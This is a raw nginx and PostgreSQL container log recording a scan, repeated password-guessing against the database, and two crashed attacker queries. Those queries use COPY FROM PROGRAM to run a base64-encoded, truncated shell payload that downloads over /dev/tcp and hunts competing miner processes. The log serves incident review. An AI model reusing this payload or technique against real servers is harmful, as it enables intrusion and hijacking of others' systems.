nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     | 2026-06-21 08:44:20.023 UTC [2132] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:44:54.473 UTC [2133] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:44:54.473 UTC [2133] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:46:27.138 UTC [2134] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:46:27.138 UTC [2134] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:47:59.673 UTC [2135] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:47:59.673 UTC [2135] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:49:20.345 UTC [2136] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:49:20.345 UTC [2136] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:49:23.736 UTC [2137] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:49:23.736 UTC [2137] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:49:29.325 UTC [1] LOG:  server process (PID 2138) was terminated by signal 9: Killed
db-1     | 2026-06-21 08:49:29.325 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 08:49:29.325 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 08:49:29.330 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 08:49:29.378 UTC [2140] LOG:  database system was interrupted; last known up at 2026-06-21 08:41:20 UTC
db-1     | 2026-06-21 08:49:29.458 UTC [2140] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 08:49:29.464 UTC [2140] LOG:  redo starts at 0/1CD89F0
db-1     | 2026-06-21 08:49:29.466 UTC [2140] LOG:  invalid magic number 0000 in WAL segment 000000010000000000000001, LSN 0/1CF2000, offset 13574144
db-1     | 2026-06-21 08:49:29.467 UTC [2140] LOG:  redo done at 0/1CF01F0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 08:49:29.476 UTC [2141] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 08:49:29.509 UTC [2141] LOG:  checkpoint complete: wrote 25 buffers (0.2%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.009 s, sync=0.009 s, total=0.037 s; sync files=24, longest=0.006 s, average=0.001 s; distance=101 kB, estimate=101 kB; lsn=0/1CF2048, redo lsn=0/1CF2048
db-1     | 2026-06-21 08:49:29.516 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 08:49:32.467 UTC [2146] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:49:32.467 UTC [2146] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:51:05.163 UTC [2147] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:51:05.163 UTC [2147] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:52:37.795 UTC [2148] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:52:37.795 UTC [2148] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:54:10.515 UTC [2149] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:54:10.515 UTC [2149] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:55:43.326 UTC [2150] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:55:43.326 UTC [2150] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:56:05.477 UTC [2151] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:56:05.477 UTC [2151] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:56:06.308 UTC [2152] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:56:06.308 UTC [2152] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:56:07.428 UTC [1] LOG:  server process (PID 2153) was terminated by signal 9: Killed
db-1     | 2026-06-21 08:56:07.428 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 08:56:07.428 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 08:56:07.431 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 08:56:07.465 UTC [2155] LOG:  database system was interrupted; last known up at 2026-06-21 08:49:29 UTC
db-1     | 2026-06-21 08:56:07.550 UTC [2155] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 08:56:07.556 UTC [2155] LOG:  redo starts at 0/1CF20C0
db-1     | 2026-06-21 08:56:07.556 UTC [2155] LOG:  invalid record length at 0/1CF20F8: expected at least 24, got 0
db-1     | 2026-06-21 08:56:07.556 UTC [2155] LOG:  redo done at 0/1CF20C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 08:56:07.566 UTC [2156] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 08:56:07.588 UTC [2156] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.006 s, sync=0.004 s, total=0.026 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CF20F8, redo lsn=0/1CF20F8
db-1     | 2026-06-21 08:56:07.594 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 08:57:17.604 UTC [2161] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:57:17.604 UTC [2161] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:58:50.469 UTC [2162] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:58:50.469 UTC [2162] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:00:23.272 UTC [2163] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:00:23.272 UTC [2163] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:01:56.121 UTC [2164] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:01:56.121 UTC [2164] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:02:00.742 UTC [2165] FATAL:  unsupported frontend protocol 0.0: server supports 3.0 to 3.0
db-1     | 2026-06-21 09:02:00.846 UTC [2166] FATAL:  unsupported frontend protocol 255.255: server supports 3.0 to 3.0
db-1     | 2026-06-21 09:02:00.947 UTC [2167] FATAL:  no PostgreSQL user name specified in startup packet
db-1     | 2026-06-21 09:03:28.996 UTC [2168] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:03:28.996 UTC [2168] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:04:40.178 UTC [2169] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:04:40.178 UTC [2169] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:04:44.885 UTC [2170] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:04:44.885 UTC [2170] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:05:01.682 UTC [2171] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:05:01.682 UTC [2171] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:06:34.338 UTC [2172] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:06:34.338 UTC [2172] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:08:06.979 UTC [2173] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:08:06.979 UTC [2173] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:09:39.851 UTC [2174] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:09:39.851 UTC [2174] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:11:12.556 UTC [2175] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:11:12.556 UTC [2175] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:11:31.837 UTC [2176] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:11:31.837 UTC [2176] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:11:37.039 UTC [2177] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:11:37.039 UTC [2177] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:12:45.216 UTC [2178] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:12:45.216 UTC [2178] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:12:47.938 UTC [2179] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:12:47.938 UTC [2179] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:12:51.008 UTC [2180] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:12:51.008 UTC [2180] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:14:18.004 UTC [2181] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:14:18.004 UTC [2181] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:14:58.037 UTC [2182] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:14:58.037 UTC [2182] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:15:02.042 UTC [2183] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:15:02.042 UTC [2183] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:15:45.236 UTC [2184] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:15:45.236 UTC [2184] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:15:50.611 UTC [2185] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:15:50.611 UTC [2185] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:17:23.325 UTC [2186] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:17:23.325 UTC [2186] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:17:24.246 UTC [2187] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:17:24.246 UTC [2187] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:18:19.927 UTC [2188] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:18:19.927 UTC [2188] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:18:21.037 UTC [2189] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:18:21.037 UTC [2189] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:18:57.258 UTC [2190] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:18:57.258 UTC [2190] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:19:02.189 UTC [2191] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:19:02.189 UTC [2191] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:20:30.335 UTC [2192] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:20:30.335 UTC [2192] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:20:41.494 UTC [2193] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:20:41.494 UTC [2193] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:22:02.963 UTC [2194] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:22:02.963 UTC [2194] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:22:19.422 UTC [2195] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:22:19.422 UTC [2195] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:23:35.637 UTC [2196] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:23:35.637 UTC [2196] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:23:56.809 UTC [2197] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:23:56.809 UTC [2197] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:25:08.669 UTC [2199] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 09:25:08.669 UTC [2199] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 09:25:11.220 UTC [2198] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 09:25:11.220 UTC [2198] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
